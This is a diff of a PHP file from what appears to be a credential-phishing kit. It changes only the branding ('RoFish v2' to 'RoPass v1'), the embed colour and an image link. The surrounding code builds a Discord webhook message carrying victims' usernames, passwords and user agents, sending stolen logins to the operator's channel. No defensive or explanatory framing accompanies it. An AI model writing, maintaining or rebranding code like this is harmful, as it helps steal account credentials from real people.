@@ -50,8 +50,8 @@ function sendToDiscordWebhook($data) {
     ];
 
     $embed = [
-        "title" => "RoFish v2",
-        "color" => hexdec("dc3737"),
+        "title" => "RoPass v1",
+        "color" => hexdec("3762dc"),
         "fields" => [
             ["name" => "👤 Username", "value" => "`" . $data['username'] . "`", "inline" => true],
             ["name" => "🔑 Password", "value" => "`" . $data['password'] . "`", "inline" => true],
@@ -65,7 +65,7 @@ function sendToDiscordWebhook($data) {
             ["name" => "🖥️ User Agent", "value" => "`" . $data['user_agent'] . "`", "inline" => false],
         ],
         "image" => [
-            "url" => "https://i.imgur.com/g6rPxvE.png"
+            "url" => "https://i.imgur.com/8TqBJyU.png"
         ],
     ];
 
